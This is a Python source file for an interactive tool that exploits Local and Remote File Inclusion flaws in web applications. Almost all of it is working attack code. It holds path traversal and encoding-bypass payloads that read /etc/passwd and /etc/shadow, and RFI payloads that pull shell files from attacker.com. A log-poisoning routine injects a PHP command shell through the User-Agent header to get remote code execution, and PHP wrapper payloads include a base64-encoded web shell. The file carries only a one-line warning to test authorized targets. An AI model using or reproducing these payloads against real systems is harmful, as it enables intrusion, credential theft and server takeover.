#!/usr/bin/env python3
"""
LFI/RFI Exploiter
Local/Remote File Inclusion vulnerability tester and exploiter
"""

import requests
import re
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import base64
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def run():
    print("\033[92m" + "="*70)
    print("           LFI/RFI EXPLOITER")
    print("="*70 + "\033[0m\n")
    
    print("\033[93m[!] WARNING: Only test on authorized targets!\033[0m\n")
    
    print("\033[97mChoose Attack Type:\033[0m")
    print("  [1] Local File Inclusion (LFI) - Basic")
    print("  [2] Local File Inclusion (LFI) - Advanced (filters bypass)")
    print("  [3] Remote File Inclusion (RFI)")
    print("  [4] LFI to RCE (Log poisoning)")
    print("  [5] PHP Wrapper Exploitation")
    print("  [6] Automated LFI/RFI Scanner")
    
    choice = input("\n\033[95m[?] Select option: \033[0m").strip()
    
    if choice == '1':
        test_lfi_basic()
    elif choice == '2':
        test_lfi_advanced()
    elif choice == '3':
        test_rfi()
    elif choice == '4':
        test_lfi_to_rce()
    elif choice == '5':
        test_php_wrappers()
    elif choice == '6':
        automated_scanner()
    else:
        print("\033[91m[!] Invalid choice.\033[0m")

def test_lfi_basic():
    """Test basic LFI vulnerabilities"""
    print("\n\033[92m[*] Basic LFI Tester\033[0m\n")
    
    target_url = input("\033[97m[?] Target URL with parameter (e.g., http://site.com/page.php?file=): \033[0m").strip()
    if not target_url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    # Basic LFI payloads
    LFI_PAYLOADS = [
        # Direct access
        '/etc/passwd',
        '/etc/shadow',
        '/etc/hosts',
        '/proc/self/environ',
        '/proc/version',
        '/var/log/apache2/access.log',
        '/var/log/apache/access.log',
        '/var/log/httpd/access_log',
        
        # Relative path traversal
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '../../../../../etc/passwd',
        '../../../../../../etc/passwd',
        '../../../../../../../etc/passwd',
        
        # Encoded traversal
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '..%252F..%252F..%252Fetc%252Fpasswd',
        
        # Windows paths
        'C:/Windows/System32/drivers/etc/hosts',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        '../../../windows/win.ini',
        '../../../../windows/win.ini',
        
        # Null byte bypass (older PHP)
        '../../../etc/passwd%00',
        '../../../etc/passwd%00.jpg',
    ]
    
    print(f"\033[97m[*] Testing {len(LFI_PAYLOADS)} LFI payloads...\033[0m\n")
    
    vulnerabilities = []
    
    for payload in LFI_PAYLOADS:
        try:
            test_url = target_url + payload
            response = requests.get(test_url, timeout=5, verify=False)
            
            # Check for LFI indicators
            if is_lfi_successful(response.text, payload):
                print(f"\033[92m[+] VULNERABLE: {payload}\033[0m")
                vulnerabilities.append({'payload': payload, 'url': test_url, 'response': response.text[:200]})
            else:
                print(f"\033[90m[-] No LFI: {payload}\033[0m")
                
        except Exception as e:
            print(f"\033[91m[!] Error with {payload}: {str(e)}\033[0m")
    
    # Results
    if vulnerabilities:
        print(f"\n\033[92m[+] Found {len(vulnerabilities)} potential LFI vulnerabilities!\033[0m\n")
        
        for vuln in vulnerabilities:
            print(f"\033[93mPayload: {vuln['payload']}\033[0m")
            print(f"URL: {vuln['url']}")
            print(f"Response preview: {vuln['response'][:100]}...")
            print()
        
        # Save results
        save = input("\033[95m[?] Save results? (y/n): \033[0m").strip().lower()
        if save == 'y':
            save_results(vulnerabilities, "lfi_results.txt")
    else:
        print(f"\033[93m[!] No LFI vulnerabilities found.\033[0m")

def test_lfi_advanced():
    """Test advanced LFI with filter bypasses"""
    print("\n\033[92m[*] Advanced LFI Tester (Filter Bypass)\033[0m\n")
    
    target_url = input("\033[97m[?] Target URL with parameter: \033[0m").strip()
    if not target_url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    # Advanced bypass techniques
    ADVANCED_PAYLOADS = [
        # Double encoding
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        
        # UTF-8 encoding
        '..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd',
        '..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd',
        
        # 16-bit Unicode encoding
        '..%u2216..%u2216..%u2216etc%u2216passwd',
        
        # Path truncation (PHP < 5.3)
        '../../../etc/passwd' + '/' * 4096,
        '../../../etc/passwd' + '.' * 4096,
        
        # Filter bypass with dots
        '....//....//....//etc/passwd',
        '....//..//....//..//....//..//etc/passwd',
        
        # Mixed slashes
        '..\\../..\\../..\\../etc/passwd',
        '..\\..\\..\\/etc/passwd',
        
        # Current directory bypass
        './././etc/passwd',
        './/.//.//etc/passwd',
        
        # Zip wrapper
        'zip://archive.zip%23file.txt',
        
        # Data wrapper
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
        
        # Expect wrapper
        'expect://id',
        'expect://ls',
    ]
    
    print(f"\033[97m[*] Testing {len(ADVANCED_PAYLOADS)} advanced payloads...\033[0m\n")
    
    vulnerabilities = []
    
    for payload in ADVANCED_PAYLOADS:
        try:
            test_url = target_url + payload
            response = requests.get(test_url, timeout=5, verify=False)
            
            if is_lfi_successful(response.text, payload):
                print(f"\033[92m[+] VULNERABLE: {payload}\033[0m")
                vulnerabilities.append({'payload': payload, 'url': test_url})
            else:
                print(f"\033[90m[-] No LFI: {payload[:50]}\033[0m")
                
        except Exception as e:
            print(f"\033[91m[!] Error: {str(e)[:50]}\033[0m")
    
    if vulnerabilities:
        print(f"\n\033[92m[+] Found {len(vulnerabilities)} vulnerabilities!\033[0m")
        save_results(vulnerabilities, "lfi_advanced_results.txt")

def test_rfi():
    """Test Remote File Inclusion"""
    print("\n\033[92m[*] Remote File Inclusion Tester\033[0m\n")
    
    target_url = input("\033[97m[?] Target URL with parameter: \033[0m").strip()
    if not target_url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    print("\033[97m[!] You need a remote server hosting malicious files\033[0m")
    remote_server = input("\033[97m[?] Your remote server URL (e.g., http://attacker.com/shell.txt): \033[0m").strip()
    
    if not remote_server:
        print("\033[93m[*] Using example payloads...\033[0m")
        RFI_PAYLOADS = [
            'http://attacker.com/shell.txt',
            'http://attacker.com/shell.txt?',
            'http://attacker.com/shell.txt%00',
            'https://pastebin.com/raw/example',
            'ftp://attacker.com/shell.txt',
        ]
    else:
        RFI_PAYLOADS = [
            remote_server,
            remote_server + '?',
            remote_server + '%00',
            remote_server + '%00.jpg',
        ]
    
    print(f"\n\033[97m[*] Testing {len(RFI_PAYLOADS)} RFI payloads...\033[0m\n")
    
    for payload in RFI_PAYLOADS:
        try:
            test_url = target_url + payload
            response = requests.get(test_url, timeout=5, verify=False)
            
            # Check if remote file was included
            if 'error' not in response.text.lower() and len(response.text) > 0:
                print(f"\033[92m[+] Possible RFI: {payload}\033[0m")
                print(f"    Response length: {len(response.text)}")
            else:
                print(f"\033[90m[-] No RFI: {payload}\033[0m")
                
        except Exception as e:
            print(f"\033[91m[!] Error: {str(e)}\033[0m")

def test_lfi_to_rce():
    """Test LFI to RCE via log poisoning"""
    print("\n\033[92m[*] LFI to RCE (Log Poisoning)\033[0m\n")
    
    target_url = input("\033[97m[?] Target URL with LFI: \033[0m").strip()
    if not target_url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    # Common log file locations
    LOG_FILES = [
        '/var/log/apache2/access.log',
        '/var/log/apache/access.log',
        '/var/log/httpd/access_log',
        '/var/log/nginx/access.log',
        '/var/log/vsftpd.log',
        '/var/log/sshd.log',
        '/var/log/mail.log',
        '/proc/self/environ',
        '/var/log/auth.log',
    ]
    
    print("\033[97m[*] Step 1: Finding accessible log files...\033[0m\n")
    
    accessible_logs = []
    for log in LOG_FILES:
        try:
            payload = '../../../..' + log
            test_url = target_url + payload
            response = requests.get(test_url, timeout=5, verify=False)
            
            # Check if log file is accessible
            if any(indicator in response.text.lower() for indicator in ['get ', 'post ', 'http', 'mozilla', 'user-agent']):
                print(f"\033[92m[+] Accessible: {log}\033[0m")
                accessible_logs.append(log)
            else:
                print(f"\033[90m[-] Not accessible: {log}\033[0m")
        except:
            pass
    
    if not accessible_logs:
        print("\n\033[93m[!] No accessible log files found.\033[0m")
        return
    
    print(f"\n\033[92m[*] Step 2: Poisoning log file...\033[0m\n")
    print("\033[97m[!] This will inject PHP code into User-Agent header\033[0m")
    
    confirm = input("\033[95m[?] Continue? (y/n): \033[0m").strip().lower()
    if confirm != 'y':
        return
    
    # PHP payload in User-Agent
    php_payload = "<?php system($_GET['cmd']); ?>"
    
    # Send request with poisoned User-Agent
    headers = {'User-Agent': php_payload}
    
    try:
        requests.get(target_url, headers=headers, timeout=5, verify=False)
        print("\033[92m[+] Log poisoned!\033[0m")
        
        # Test RCE
        print("\n\033[97m[*] Step 3: Testing RCE...\033[0m\n")
        
        for log in accessible_logs:
            payload = '../../../..' + log + '&cmd=id'
            test_url = target_url + payload
            
            response = requests.get(test_url, timeout=5, verify=False)
            
            if 'uid=' in response.text or 'gid=' in response.text:
                print(f"\033[92m[+] RCE ACHIEVED via {log}!\033[0m")
                print(f"\033[93m[*] Execute commands: {target_url}../../../../{log}&cmd=YOUR_COMMAND\033[0m")
                return
        
        print("\033[93m[!] RCE not successful.\033[0m")
        
    except Exception as e:
        print(f"\033[91m[!] Error: {str(e)}\033[0m")

def test_php_wrappers():
    """Test PHP wrapper exploitation"""
    print("\n\033[92m[*] PHP Wrapper Exploitation\033[0m\n")
    
    target_url = input("\033[97m[?] Target URL with parameter: \033[0m").strip()
    if not target_url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    # PHP wrapper payloads
    WRAPPER_PAYLOADS = {
        'php://filter - Read source': 'php://filter/convert.base64-encode/resource=index.php',
        'php://filter - ROT13': 'php://filter/read=string.rot13/resource=index.php',
        'php://input - POST data': 'php://input',
        'data:// - Base64 PHP': 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
        'data:// - Plain PHP': 'data://text/plain,<?php phpinfo(); ?>',
        'expect:// - Command': 'expect://id',
        'zip:// - Archive': 'zip://archive.zip#shell.php',
        'phar:// - Archive': 'phar://archive.phar/shell.php',
    }
    
    print(f"\033[97m[*] Testing {len(WRAPPER_PAYLOADS)} PHP wrappers...\033[0m\n")
    
    vulnerabilities = []
    
    for name, payload in WRAPPER_PAYLOADS.items():
        try:
            test_url = target_url + payload
            
            # Special handling for php://input
            if 'php://input' in payload:
                response = requests.post(test_url, data='<?php system("id"); ?>', timeout=5, verify=False)
            else:
                response = requests.get(test_url, timeout=5, verify=False)
            
            # Check for successful exploitation
            if len(response.text) > 0 and 'error' not in response.text.lower():
                print(f"\033[92m[+] WORKS: {name}\033[0m")
                print(f"    Payload: {payload}")
                
                # Decode base64 if applicable
                if 'base64' in payload.lower() and len(response.text) > 0:
                    try:
                        decoded = base64.b64decode(response.text).decode('utf-8', errors='ignore')
                        print(f"    Decoded: {decoded[:100]}...")
                    except:
                        pass
                
                vulnerabilities.append({'name': name, 'payload': payload, 'url': test_url})
            else:
                print(f"\033[90m[-] Failed: {name}\033[0m")
                
        except Exception as e:
            print(f"\033[91m[!] Error with {name}: {str(e)}\033[0m")
    
    if vulnerabilities:
        print(f"\n\033[92m[+] Found {len(vulnerabilities)} working wrappers!\033[0m")
        save_results(vulnerabilities, "php_wrapper_results.txt")

def automated_scanner():
    """Automated LFI/RFI scanner"""
    print("\n\033[92m[*] Automated LFI/RFI Scanner\033[0m\n")
    
    target_url = input("\033[97m[?] Target URL: \033[0m").strip()
    if not target_url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    # Parse URL and find parameters
    parsed = urlparse(target_url)
    params = parse_qs(parsed.query)
    
    if not params:
        print("\033[91m[!] No parameters found in URL.\033[0m")
        print("\033[97m[*] URL should contain parameters, e.g., page.php?file=test&id=1\033[0m")
        return
    
    print(f"\033[97m[*] Found parameters: {', '.join(params.keys())}\033[0m\n")
    
    # All payloads combined
    ALL_PAYLOADS = [
        '/etc/passwd',
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '../../../../../etc/passwd',
        '../../../../../../etc/passwd',
        'php://filter/convert.base64-encode/resource=index.php',
        'php://input',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
        '....//....//....//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        'C:/Windows/System32/drivers/etc/hosts',
    ]
    
    vulnerabilities = []
    
    # Test each parameter
    for param_name in params.keys():
        print(f"\033[93m[*] Testing parameter: {param_name}\033[0m\n")
        
        for payload in ALL_PAYLOADS:
            try:
                # Build test URL
                test_params = params.copy()
                test_params[param_name] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                
                response = requests.get(test_url, timeout=5, verify=False)
                
                if is_lfi_successful(response.text, payload):
                    print(f"\033[92m[+] VULNERABLE: {param_name} with {payload}\033[0m")
                    vulnerabilities.append({
                        'parameter': param_name,
                        'payload': payload,
                        'url': test_url
                    })
                
            except:
                pass
        
        print()
    
    # Results
    if vulnerabilities:
        print(f"\n\033[92m[+] Found {len(vulnerabilities)} vulnerabilities!\033[0m\n")
        
        for vuln in vulnerabilities:
            print(f"\033[93mParameter: {vuln['parameter']}\033[0m")
            print(f"Payload: {vuln['payload']}")
            print(f"URL: {vuln['url']}\n")
        
        save_results(vulnerabilities, "lfi_rfi_scan_results.txt")
    else:
        print(f"\033[93m[!] No vulnerabilities found.\033[0m")

def is_lfi_successful(response_text, payload):
    """Check if LFI was successful"""
    # Linux indicators
    linux_indicators = [
        'root:x:', 'daemon:', '/bin/bash', '/bin/sh', 'nobody:',
        '/etc/passwd', 'uid=', 'gid='
    ]
    
    # Windows indicators
    windows_indicators = [
        '[extensions]', '[fonts]', '; for 16-bit app support',
        'C:\\Windows', 'C:\\WINDOWS', 'MAPI'
    ]
    
    # PHP wrapper indicators
    wrapper_indicators = [
        '<?php', 'PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
        'function ', 'class ', 'namespace '
    ]
    
    # Check for indicators
    for indicator in linux_indicators + windows_indicators + wrapper_indicators:
        if indicator in response_text:
            return True
    
    # Check for base64 encoded content (php://filter)
    if 'base64' in payload.lower():
        try:
            base64.b64decode(response_text)
            return True
        except:
            pass
    
    return False

def save_results(vulnerabilities, filename):
    """Save results to file"""
    try:
        with open(filename, 'w') as f:
            f.write("LFI/RFI Vulnerability Results\n")
            f.write("="*70 + "\n\n")
            
            for vuln in vulnerabilities:
                for key, value in vuln.items():
                    f.write(f"{key}: {value}\n")
                f.write("\n")
        
        print(f"\033[92m[*] Results saved to {filename}\033[0m")
    except Exception as e:
        print(f"\033[91m[!] Error saving: {str(e)}\033[0m")

if __name__ == "__main__":
    run()
